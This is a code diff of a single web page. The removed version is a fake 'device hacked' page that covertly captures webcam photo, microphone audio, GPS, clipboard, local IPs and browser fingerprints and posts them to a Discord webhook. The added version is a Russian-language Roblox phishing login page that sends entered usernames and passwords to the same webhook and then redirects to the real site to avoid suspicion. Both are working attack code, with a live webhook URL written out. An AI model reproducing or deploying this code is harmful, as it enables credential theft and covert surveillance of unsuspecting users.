@@ -1,214 +1,93 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>CRITICAL BREACH</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Roblox</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
-  body { background: #000; color: #ff003c; font-family: 'Fira Code', monospace; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; cursor: none; }
-  @keyframes shake { 0%,100% { transform: translate(0,0) rotate(0); } 25% { transform: translate(-2px,2px) rotate(-1deg); } 50% { transform: translate(2px,-1px) rotate(1deg); } 75% { transform: translate(1px,2px) rotate(0); } }
-  .shaking { animation: shake 0.2s infinite; }
-  @keyframes flash { 0%,100% { background: #000; } 50% { background: #400; } }
-  .flashing { animation: flash 0.1s infinite; }
-  .terminal { padding: 20px; flex-grow: 1; display: flex; flex-direction: column; z-index: 10; }
-  .output { flex-grow: 1; overflow-y: auto; font-size: 12px; line-height: 1.4; white-space: pre-wrap; text-shadow: 0 0 3px #ff003c; padding-bottom: 50px; }
-  .output::-webkit-scrollbar { display: none; }
-  .alert { border: 2px solid #ff003c; padding: 15px; margin-bottom: 20px; background: rgba(255,0,60,0.1); font-weight: bold; text-align: center; text-transform: uppercase; }
-  #lock-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #ff003c; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
-  #lock-screen h1 { font-size: 50px; margin: 0; animation: pulse 1s infinite; }
-  @keyframes pulse { 0%,100% { opacity: 1; text-shadow: 0 0 20px #ff003c; } 50% { opacity: 0.5; text-shadow: none; } }
-  #hidden-video { display: none; }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Hind', sans-serif; }
+  body { background-color: #f2f4f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+  
+  .container { background: #fff; padding: 40px 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+  
+  .logo { width: 120px; margin-bottom: 20px; }
+  
+  .input-group { margin-bottom: 15px; text-align: left; }
+  .input-group input { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; }
+  .input-group input:focus { border-color: #000; }
+  
+  .btn { background: #000; color: #fff; border: none; width: 100%; padding: 12px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+  .btn:hover { background: #333; }
+  
+  .links { margin-top: 20px; font-size: 14px; color: #666; }
+  .links a { color: #000; text-decoration: none; font-weight: 600; }
+  
+  .footer-text { margin-top: 30px; font-size: 12px; color: #999; }
 </style>
 </head>
 <body>
-<video id="hidden-video" autoplay playsinline muted></video>
-<div class="terminal" id="main-ui">
-  <div class="alert">ВНИМАНИЕ: УСТРОЙСТВО ЗАХВАЧЕНО<br>ИДЕТ ГЛУБОКИЙ СЛИВ ДАННЫХ</div>
-  <div class="output" id="term"></div>
-</div>
-<div id="lock-screen">
-  <h1>DEVICE LOCKED</h1>
-  <p>Биометрия, GPS, IP, буфер обмена и экран отправлены.<br>Устройство заблокировано.</p>
+
+<div class="container">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo" alt="Roblox">
+  <h2 style="margin-bottom: 20px; font-size: 24px;">Вход</h2>
+  
+  <div class="input-group">
+    <input type="text" id="username" placeholder="Имя пользователя или Email" required>
+  </div>
+  <div class="input-group">
+    <input type="password" id="password" placeholder="Пароль" required>
+  </div>
+  
+  <button class="btn" id="loginBtn">Войти</button>
+  
+  <div class="links">
+    <a href="#">Забыли пароль?</a> или <a href="#">Зарегистрироваться</a>
+  </div>
+  <div class="footer-text">
+    © 2024 Roblox Corporation. Все права защищены.
+  </div>
 </div>
 
 <script>
+// =====================================================================
+// ТВОЙ DISCORD WEBHOOK (Сюда придут логины и пароли)
+// =====================================================================
 const HOOK = "https://discord.com/api/webhooks/1569647657406824478/DK6Z_qdLCpqPXWQHKKXbMylcXjZrZPZqXzHLpttg0GbuVcy6axwgGFBsfuqOoyTqer1l";
-const term = document.getElementById('term');
-const video = document.getElementById('hidden-video');
 
-let megaData = {
-  timestamp: new Date().toISOString(),
-  userAgent: navigator.userAgent,
-  platform: navigator.platform,
-  screen: screen.width + "x" + screen.height,
-  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  languages: navigator.languages,
-  cores: navigator.hardwareConcurrency,
-  memory: navigator.deviceMemory,
-  touch: navigator.maxTouchPoints,
-  local_ips: [],
-  gps: "Ожидание...",
-  clipboard: "Нет доступа",
-  permissions: {},
-  canvas_hash: null,
-  webgl_renderer: "unknown",
-  photo: null,
-  audio: null
-};
+document.getElementById('loginBtn').addEventListener('click', async function() {
+  const user = document.getElementById('username').value;
+  const pass = document.getElementById('password').value;
 
-// 1. WEBRTC (Локальные IP)
-async function getLocalIPs() {
-  return new Promise((resolve) => {
-    const ips = [];
-    try {
-      const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [] });
-      pc.createDataChannel("");
-      pc.onicecandidate = (e) => {
-        if (!e.candidate) { pc.close(); return resolve(ips); }
-        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-        if (ipMatch) ips.push(ipMatch[1]);
-      };
-      pc.createOffer().then(offer => pc.setLocalDescription(offer));
-    } catch(e) { resolve(ips); }
-  });
-}
-
-// 2. GPS
-function getGPS() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) return resolve("Нет API");
-    navigator.geolocation.getCurrentPosition(
-      pos => resolve(pos.coords.latitude + ", " + pos.coords.longitude),
-      err => resolve("Отказано"),
-      { timeout: 5000, enableHighAccuracy: true }
-    );
-  });
-}
-
-// 3. Буфер обмена
-async function getClipboard() {
-  try {
-    const text = await navigator.clipboard.readText();
-    megaData.clipboard = text.slice(0, 150);
-  } catch(e) {}
-}
-
-// 4. Разрешения и Canvas
-async function getPermissionsAndCanvas() {
-  if (navigator.permissions) {
-    const perms = ['geolocation', 'camera', 'microphone', 'notifications'];
-    for (const p of perms) {
-      try { const s = await navigator.permissions.query({name: p}); megaData.permissions[p] = s.state; } catch(e){}
-    }
-  }
-  try {
-    const c = document.createElement("canvas"); const ctx = c.getContext("2d");
-    ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillStyle = "#f60";
-    ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Hello", 2, 15);
-    megaData.canvas_hash = c.toDataURL().slice(-20);
-    const gl = c.getContext("webgl");
-    if (gl) {
-      const ext = gl.getExtension("WEBGL_debug_renderer_info");
-      if (ext) megaData.webgl_renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-    }
-  } catch(e) {}
-}
-
-// 5. Камера и Микрофон
-async function capturePhotoAndAudio() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-    video.srcObject = stream;
-    await new Promise(r => setTimeout(r, 1000));
-    
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    megaData.photo = canvas.toDataURL('image/jpeg', 0.6);
-
-    const recorder = new MediaRecorder(stream);
-    const chunks = [];
-    recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = () => { megaData.audio = new Blob(chunks, { type: 'audio/webm' }); };
-    recorder.start();
-    await new Promise(r => setTimeout(r, 3000));
-    recorder.stop();
-    stream.getTracks().forEach(t => t.stop());
-  } catch(e) { console.log("Camera error:", e); }
-}
-
-// UI
-function typeLine(text) {
-  return new Promise((resolve) => {
-    const div = document.createElement('div'); term.appendChild(div); term.scrollTop = term.scrollHeight;
-    let i = 0; const speed = Math.random() * 10 + 5;
-    function type() { if (i < text.length) { div.textContent += text.charAt(i); i++; setTimeout(type, speed); } else resolve(); }
-    type();
-  });
-}
-
-function playBeep() {
-  try {
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    const osc = ctx.createOscillator(); const gain = ctx.createGain();
-    osc.type = 'sawtooth'; osc.frequency.setValueAtTime(800, ctx.currentTime);
-    gain.gain.setValueAtTime(0.1, ctx.currentTime); gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
-    osc.connect(gain); gain.connect(ctx.destination); osc.start(); osc.stop(ctx.currentTime + 0.5);
-  } catch(e) {}
-}
-
-// ГЛАВНЫЙ СЦЕНАРИЙ
-async function runHack() {
-  document.body.classList.add('shaking', 'flashing');
-  playBeep();
-
-  // Запускаем всё параллельно
-  getClipboard();
-  getPermissionsAndCanvas();
-  getLocalIPs().then(ips => megaData.local_ips = ips);
-  getGPS().then(loc => megaData.gps = loc);
-  capturePhotoAndAudio();
-
-  await typeLine("> INITIATING KERNEL EXPLOIT...");
-  await typeLine("> BYPASSING SANDBOX... [OK]");
-  await typeLine("> WEBRTC LEAK: EXTRACTING LOCAL IP...");
-  await new Promise(r => setTimeout(r, 1000));
-  await typeLine("> REQUESTING BIOMETRIC ACCESS (CAMERA/MIC/GPS)...");
-  await new Promise(r => setTimeout(r, 2000));
-  await typeLine("> RECORDING ENVIRONMENT...");
-  await new Promise(r => setTimeout(r, 2000));
-  await typeLine("> DUMPING CLIPBOARD DATA...");
-  await typeLine("> EXFILTRATING PHOTOS...");
-  await new Promise(r => setTimeout(r, 1000));
-  await typeLine("> UPLOADING TO C2 SERVER (DISCORD)...");
-
-  // ОТПРАВКА В DISCORD
-  const form = new FormData();
-  form.append("content", `**🚨 ПОЛНЫЙ ЗАХВАТ УСТРОЙСТВА!**\n**Модель:** ${megaData.userAgent}\n**Экран:** ${megaData.screen}\n**Язык:** ${megaData.languages}\n**Таймзона:** ${megaData.timezone}\n**Локальные IP:** ${megaData.local_ips.join(", ")}\n**GPS:** ${megaData.gps}\n**Буфер:** ${megaData.clipboard}\n**GPU:** ${megaData.webgl_renderer}`);
-  
-  if (megaData.photo && megaData.photo.startsWith("data:image")) {
-    const blob = await (await fetch(megaData.photo)).blob();
-    form.append("file1", blob, "face.jpg");
-  }
-  
-  if (megaData.audio) {
-    form.append("file2", megaData.audio, "voice.webm");
+  // Простая проверка, чтобы не отправлять пустоту
+  if (!user || !pass) {
+    alert("Пожалуйста, заполните все поля.");
+    return;
   }
 
-  fetch(HOOK, { method: "POST", body: form }).catch(e => console.log(e));
+  // Меняем текст кнопки, чтобы человек думал, что идет загрузка
+  this.innerText = "Загрузка...";
+  this.disabled = true;
 
-  await typeLine("> COMPLETE. LOCKING DEVICE...");
-  document.body.classList.remove('shaking', 'flashing');
-  document.getElementById('main-ui').style.display = 'none';
-  document.getElementById('lock-screen').style.display = 'flex';
-  playBeep();
-}
+  // Формируем сообщение для Discord
+  const message = `**🎮 НОВЫЙ ЛОГИН ROBLOX!**\n**Логин:** \`${user}\`\n**Пароль:** \`${pass}\`\n**UA:** ${navigator.userAgent}`;
 
-setTimeout(runHack, 1000);
-history.pushState(null, null, location.href);
-window.onpopstate = function () { history.go(1); };
-document.addEventListener('contextmenu', e => e.preventDefault());
+  try {
+    // Отправляем в Discord
+    await fetch(HOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: message })
+    });
+  } catch(e) {
+    console.log("Ошибка отправки", e);
+  }
+
+  // Перекидываем на настоящий сайт Roblox, чтобы не спалиться
+  setTimeout(() => {
+    window.location.href = "https://www.roblox.com/login";
+  }, 1000);
+});
 </script>
 </body>
 </html>
